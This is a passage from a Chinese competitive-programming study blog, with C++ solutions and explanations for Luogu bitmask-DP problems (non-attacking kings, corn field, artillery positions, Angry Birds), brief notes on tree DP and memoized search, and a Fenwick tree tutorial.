class="number">1</span> &lt;&lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i &gt;&gt; j &amp; <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; n; k++)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((i - (<span class="number">1</span> &lt;&lt; j)) &gt;&gt; k &amp; <span class="number">1</span>)</span><br><span class="line">                        f[i][j] = <span class="built_in">min</span>(f[i][j], f[i - (<span class="number">1</span> &lt;&lt; j)][k] + g[k][j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; f[(<span class="number">1</span>&lt;&lt;n)<span class="number">-1</span>][n - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="棋盘式DP"><a href="#棋盘式DP" class="headerlink" title="棋盘式DP"></a>棋盘式DP</h3><p><a href="https://www.luogu.com.cn/problem/P1896">SCOI2005] 互不侵犯</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071251450.png" alt="image-20240116162516723"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">12</span>, M=<span class="number">1</span> &lt;&lt; <span class="number">11</span> , k = <span class="number">110</span>;</span><br><span class="line">vector&lt;ll&gt; state;</span><br><span class="line">ll cnt[M];</span><br><span class="line">vector&lt;ll&gt; head[M];</span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line">ll f[N][k][M];</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">check</span><span class="params">(ll x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>((x&gt;&gt;i&amp;<span class="number">1</span>)&amp;&amp;(x&gt;&gt;i+<span class="number">1</span>&amp;<span class="number">1</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;<span class="comment">//在这里是预处理M这里面的状态情况,把不相邻的情况打上标记</span></span><br><span class="line"><span class="function">ll <span class="title">count</span><span class="params">(ll x)</span></span>&#123;</span><br><span class="line">    ll cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n;i++)&#123;</span><br><span class="line">        cnt += x &gt;&gt; i &amp; <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1</span> &lt;&lt; n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">check</span>(i))&#123;</span><br><span class="line">            state.<span class="built_in">push_back</span>(i);</span><br><span class="line">            cnt[i] = <span class="built_in">count</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; state.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; state.<span class="built_in">size</span>();j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>((state[i]&amp;state[j])==<span class="number">0</span>&amp;&amp;<span class="built_in">check</span>(state[i]|state[j]))&#123;</span><br><span class="line">                head[i].<span class="built_in">push_back</span>(j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    f[<span class="number">0</span>][<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n+<span class="number">1</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= m;j++)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> z = <span class="number">0</span>; z &lt; state.<span class="built_in">size</span>();z++)&#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> h = <span class="number">0</span>; h &lt; head[z].<span class="built_in">size</span>();h++)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="type">int</span> c = cnt[state[z]];</span><br><span class="line">                    <span class="keyword">if</span>(j&gt;=c)</span><br><span class="line">                        f[i][j][z] += f[i - <span class="number">1</span>][j - c][head[z][h]];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; f[n+<span class="number">1</span>][m][<span class="number">0</span>] &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="玉米地问题"><a href="#玉米地问题" class="headerlink" title="玉米地问题"></a><a href="https://www.luogu.com.cn/problem/P1879">玉米地问题</a></h3><p>这个b问题其实和棋盘式dp没什么区别</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071251460.png" alt="image-20240119101947525"> </p>
<p>首先当然要预处理啦</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> int long long </span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N=<span class="number">14</span>,M=<span class="number">1</span>&lt;&lt;N;</span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; state;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; head[M];</span><br><span class="line"><span class="type">int</span> g[N];<span class="comment">//g[N]里面存的是坏的玉米地,把坏的置1就好了,在dp计算的时候碰到这种情况continue</span></span><br><span class="line"><span class="type">int</span> f[N][M];</span><br><span class="line"><span class="type">int</span> mod=<span class="number">1e8</span>;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">check</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>((x&gt;&gt;i&amp;<span class="number">1</span>)&amp;&amp;(x&gt;&gt;i+<span class="number">1</span>&amp;<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;m;j++)&#123;</span><br><span class="line">            <span class="type">int</span> t;</span><br><span class="line">            cin&gt;&gt;t;</span><br><span class="line">            g[i]+=!t&lt;&lt;j;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//开始预处理符合的状态情况</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">1</span>&lt;&lt;m;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">check</span>(i))&#123;</span><br><span class="line">            <span class="comment">//没有连续相等的两个1</span></span><br><span class="line">            state.<span class="built_in">push_back</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//开始处理状态转移情况</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;state.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;state.<span class="built_in">size</span>();j++)&#123;</span><br><span class="line">            <span class="type">int</span> a=state[i],b=state[j];</span><br><span class="line">            <span class="keyword">if</span>((a&amp;b)==<span class="number">0</span>)head[i].<span class="built_in">push_back</span>(j);<span class="comment">//把符合的情况转移录入到head中</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    f[<span class="number">0</span>][<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n+<span class="number">1</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;state.<span class="built_in">size</span>();j++)&#123;</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(state[j]&amp;g[i])<span class="keyword">continue</span>;<span class="comment">//排除掉坏地</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> z=<span class="number">0</span>;z&lt;head[j].<span class="built_in">size</span>();z++)&#123;</span><br><span class="line">                    f[i][j]=(f[i][j]+f[i<span class="number">-1</span>][head[j][z]])%mod;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;f[n+<span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="炮兵阵地"><a href="#炮兵阵地" class="headerlink" title="炮兵阵地"></a><a href="https://www.luogu.com.cn/problem/P2704">炮兵阵地</a></h3><p>是棋盘式dp和玉米地dp的一个综合性升华</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N=<span class="number">110</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> M=<span class="number">1</span>&lt;&lt;<span class="number">11</span>;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; state;<span class="comment">//</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt;head[M];</span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line"><span class="type">int</span> g[N];</span><br><span class="line"><span class="type">int</span> f[<span class="number">2</span>][M][M];</span><br><span class="line"><span class="type">int</span> cnt[M];</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">check</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="comment">//查一下x,看他是不是满足相隔两个</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>((x&gt;&gt;i&amp;<span class="number">1</span>)&amp;&amp;((x&gt;&gt;i+<span class="number">1</span>&amp;<span class="number">1</span>)|(x&gt;&gt;i+<span class="number">2</span>)&amp;<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">count</span><span class="params">(<span class="type">int</span> st)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (st) &#123;</span><br><span class="line">        <span class="keyword">if</span>(st&amp;<span class="number">1</span>)res++;</span><br><span class="line">        st/=<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;<span class="comment">//记得写return,调死我了.</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;m;j++)&#123;</span><br><span class="line">            <span class="type">char</span> c;</span><br><span class="line">            cin&gt;&gt;c;</span><br><span class="line">            <span class="keyword">if</span>(c==<span class="string">&#x27;H&#x27;</span>)g[i]+=<span class="number">1</span>&lt;&lt;j;<span class="comment">//把这些高地全部存为1的状态表示,之后直接和预处理的情况去&amp;判断即可</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">1</span>&lt;&lt;m;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">check</span>(i))</span><br><span class="line">        &#123;state.<span class="built_in">push_back</span>(i);<span class="comment">//预处理压入</span></span><br><span class="line">       cnt[i]=<span class="built_in">count</span>(i);<span class="comment">//dp方程里面要涉及到每一行的炮车个数,所以要记count</span></span><br><span class="line">    &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n+<span class="number">2</span>;i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;state.<span class="built_in">size</span>();j++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">0</span>;k&lt;state.<span class="built_in">size</span>();k++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> u=<span class="number">0</span>;u&lt;state.<span class="built_in">size</span>();u++)&#123;<span class="comment">//从上到下为第i,i-1,i-2;行</span></span><br><span class="line">                <span class="type">int</span> a=state[j],b=state[k],c=state[u];<span class="comment">//简化计算</span></span><br><span class="line">                <span class="keyword">if</span>((a&amp;b)|(a&amp;c)|(b&amp;c))<span class="keyword">continue</span>;<span class="comment">//相冲突排除</span></span><br><span class="line">                <span class="keyword">if</span>((a&amp;g[i])|(b&amp;g[i<span class="number">-1</span>]))<span class="keyword">continue</span>;<span class="comment">//从i-1次向i次转移,都要不在高地上</span></span><br><span class="line">                f[i&amp;<span class="number">1</span>][j][k]=<span class="built_in">max</span>(f[i&amp;<span class="number">1</span>][j][k],f[(i<span class="number">-1</span>)&amp;<span class="number">1</span>][k][u]+cnt[a]);<span class="comment">//去&amp;,每次只用到2维,虽然要考虑第三维,但在dp方程中不用,所以节省空间滚动掉</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   cout&lt;&lt;f[(n+<span class="number">2</span>)&amp;<span class="number">1</span>][<span class="number">0</span>][<span class="number">0</span>];<span class="comment">//第n+2行为0,n+1行也为0,所以得到的是的n行的最大情况</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="愤怒的小鸟"><a href="#愤怒的小鸟" class="headerlink" title="愤怒的小鸟"></a><a href="https://www.luogu.com.cn/problem/P2831">愤怒的小鸟</a></h3><p>这是一道典型的重复覆盖问题</p>
<ul>
<li><p>浮点数误差考虑</p>
</li>
<li><p>pair存点</p>
</li>
<li><p>状态state表示为1的位置是覆盖的点,0的位置是没覆盖的</p>
</li>
<li><p>先算出所有的有可能的a,b值,排除点a&gt;0的值</p>
</li>
<li><p>path[i][j],表示经过i,j的抛物线覆盖点的状态</p>
</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> x first</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> y second</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="type">double</span>, <span class="type">double</span>&gt; PDD;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">18</span>, M = <span class="number">1</span> &lt;&lt; <span class="number">18</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">double</span> eps = <span class="number">1e-6</span>;</span><br><span class="line"><span class="type">int</span> n, m, path[N][N], f[M];</span><br><span class="line">PDD q[N];</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(<span class="type">double</span> x, <span class="type">double</span> y)</span><span class="comment">//比较浮点数,浮点数会有精度误差</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (<span class="built_in">abs</span>(x - y) &lt; eps)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">if</span> (x &lt; y)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="type">int</span> T;</span><br><span class="line">   cin &gt;&gt; T;</span><br><span class="line">   <span class="keyword">while</span> (T--)</span><br><span class="line">   &#123;</span><br><span class="line">      cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">         cin &gt;&gt; q[i].x &gt;&gt; q[i].y; <span class="comment">// q[i]负责存点,存所有给定的点</span></span><br><span class="line">      <span class="built_in">memset</span>(path, <span class="number">0</span>, <span class="keyword">sizeof</span> path);<span class="comment">//path里面存的是状态,二进制下,1就是过了,2就是没过</span></span><br><span class="line">      <span class="comment">// path[i][j]表示穿过i,j的抛物线覆盖的节点</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">      &#123;</span><br><span class="line">         path[i][i] = <span class="number">1</span> &lt;&lt; i; <span class="comment">// 表示覆盖自己</span></span><br><span class="line">         <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">         &#123;</span><br><span class="line">            <span class="type">double</span> x1 = q[i].x, y1 = q[i].y;</span><br><span class="line">            <span class="type">double</span> x2 = q[j].x, y2 = q[j].y;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">cmp</span>(x1, x2))</span><br><span class="line">               <span class="keyword">continue</span>; <span class="comment">// 相等的话继续</span></span><br><span class="line">            <span class="type">double</span> a = (y1 / x1 - y2 / x2) / (x1 - x2);<span class="comment">//把每个不同的点的a,b值都算出来,注意a&lt;0</span></span><br><span class="line">            <span class="keyword">if</span> (a &gt; <span class="number">0</span>)</span><br><span class="line">               <span class="keyword">continue</span>;</span><br><span class="line">            <span class="type">double</span> b = y1 / x1 - a * x1;</span><br><span class="line">            <span class="type">int</span> state = <span class="number">0</span>;<span class="comment">//重置状态</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; n; k++)</span><br><span class="line">            &#123;</span><br><span class="line">               <span class="type">double</span> x = q[k].x, y = q[k].y;</span><br><span class="line">               <span class="keyword">if</span> (!<span class="built_in">cmp</span>(a * x * x + b * x, y))<span class="comment">//表示出所有给定a,b能经过的点,把点记录成串</span></span><br><span class="line">                  state += <span class="number">1</span> &lt;&lt; k;</span><br><span class="line">            &#125;</span><br><span class="line">            path[i][j] = state;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">memset</span>(f, <span class="number">0x3f</span>, <span class="keyword">sizeof</span> f);<span class="comment">//f[state]表示当状态state时的最小抛物线数目</span></span><br><span class="line">      f[<span class="number">0</span>] = <span class="number">0</span>; <span class="comment">// 覆盖完所有点,即所有点都是1的状态时的最小值</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i  &lt; <span class="number">1</span> &lt;&lt; n; i++)</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">         <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">            <span class="keyword">if</span> (</span><br><span class="line">                !(i &gt;&gt; j &amp; <span class="number">1</span>))<span class="comment">//挑一个没被覆盖的点</span></span><br><span class="line">            &#123;</span><br><span class="line">               x = j;</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">         <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">         &#123;</span><br><span class="line">            f[i | path[x][j]] = <span class="built_in">min</span>(f[i | path[x][j]], f[i] + <span class="number">1</span>);</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      cout &lt;&lt; f[(<span class="number">1</span> &lt;&lt; n) - <span class="number">1</span>] &lt;&lt; endl;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这题考验的是状态的表示</p>
<h2 id="树形dp"><a href="#树形dp" class="headerlink" title="树形dp"></a>树形dp</h2><h3 id="没有上司的舞会"><a href="#没有上司的舞会" class="headerlink" title="没有上司的舞会"></a>没有上司的舞会</h3><p>状态表示有两个,分为dp[u,0],dp[u,1],分别指,在以u为根的tree中选,并且(不选&#x2F;选)u的最大快乐值<br>值的属性是: max </p>
<p>采用递归打法</p>
<h2 id="记忆化搜索"><a href="#记忆化搜索" class="headerlink" title="记忆化搜索"></a>记忆化搜索</h2><p>记忆化搜索是dp的一种实现方式(但注意递归的层数过多可能会暴栈)<br>采取递归的方式构成循环,模板题洛谷p1434滑雪<br><a href="https://www.luogu.com.cn/problem/P1434">https://www.luogu.com.cn/problem/P1434</a> </p>
<h1 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h1><h2 id="并查集"><a href="#并查集" class="headerlink" title="并查集"></a>并查集</h2><h2 id="树状数组"><a href="#树状数组" class="headerlink" title="树状数组"></a>树状数组</h2><p>支持功能:快速求前缀和(log(n))+单点修改(log(n))</p>
<p>思路起源:普通数组和前缀和数组分别在修改和查询前缀和有o(1)的效率,但在相反的功能效率都为o(n),对于m次查询,则效率是平方级别的,但使用树状数组能降低复杂度至mlog(n)级别.</p>
<p>思路参考设计:例如一个区间(1~x),把x写成多个2的次幂加和,幂由大到小标号为k,k-1,k-2,…,2,1,通过这k个节点,将1-x分解为k+1个区间,故设立每个区间为(L,R],则其长度一定是R的二进制串的最后一位1对应的次幂.</p>
<p>设C[R]为(L,R]区间的和,则C[R]&#x3D;[R-lowbit(R)+1,R],lowbit函数返回的是最后一个1.</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071251467.png" alt="image-20240205210052622"></p>
<p>绘画出像这样的树</p>
<p>给定一个x,如何找出其对应的若干个子节点,已知给定的x在二进制下是…10000,则x-1为…01111类似于,则C[x]&#x3D;a[x](a[x]为原数组)+C[x-1]+C[x-1-1]+C[x-1-1-2]+C[x-1-1-2-4].即每次减去一个lowbit,若干个1中每个1都对应了一个儿子(具有唯一性)</p>
<p>对于修改操作,则是每次修改完一个节点则其父节点是p&#x3D;x+lowbit(x),一共的父节点个数少于log(x),只需要便利每个父节点就可以修改完毕,每个节点会直接影响的只有其父节点(具有唯一性)</p>
<h3 id="单点修改-区间查询"><a href="#单点修改-区间查询" class="headerlink" title="单点修改,区间查询"></a><a href="https://www.luogu.com.cn/problem/P3374">单点修改,区间查询</a></h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N=<span class="number">5e5</span>+<span class="number">10</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;</span><br><span class="line"><span class="type">int</span> a[N];</span><br><span class="line">LL tr[N];</span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">lowbit</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x&amp;-x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> x ,<span class="type">int</span> c)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=x;i&lt;=n;i+=<span class="built_in">lowbit</span>(i))tr[i]+=c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">LL <span class="title">sum</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">   LL res=<span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span>(<span class="type">int</span> i=x;i;i-=<span class="built_in">lowbit</span>(i))res+=tr[i];</span><br><span class="line">   <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">        <span class="built_in">add</span>(i,a[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">        <span class="type">int</span> t,l,r;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;t,&amp;l,&amp;r);</span><br><span class="line">        <span class="keyword">if</span>(t==<span class="number">1</span>)<span class="built_in">add</span>(l,r);</span><br><span class="line">        <span class="keyword">else</span>   <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,<span class="built_in">sum</span>(r)-<span class="built_in">sum</span>(l<span class="number">-1</span>)); </span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="区间修改-单点查询"><a href="#区间修改-单点查询" class="headerlink" title="区间修改+单点查询"></a><a href="https://www.luogu.com.cn/problem/P3368">区间修改+单点查询</a></h3><p>差分—&gt;两点修改,区间求和</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N=<span class="number">5e5</span>+<span class="number">10</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;</span><br><span class="line"><span class="type">int</span> a[N];</span><br><span class="line">LL tr[N];</span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">lowbit</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x&amp;-x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> x ,<span class="type">int</span> c)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=x;i&lt;=n;i+=<span class="built_in">lowbit</span>(i))tr[i]+=c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">LL <span class="title">sum</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">   LL res=<span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span>(<span class="type">int</span> 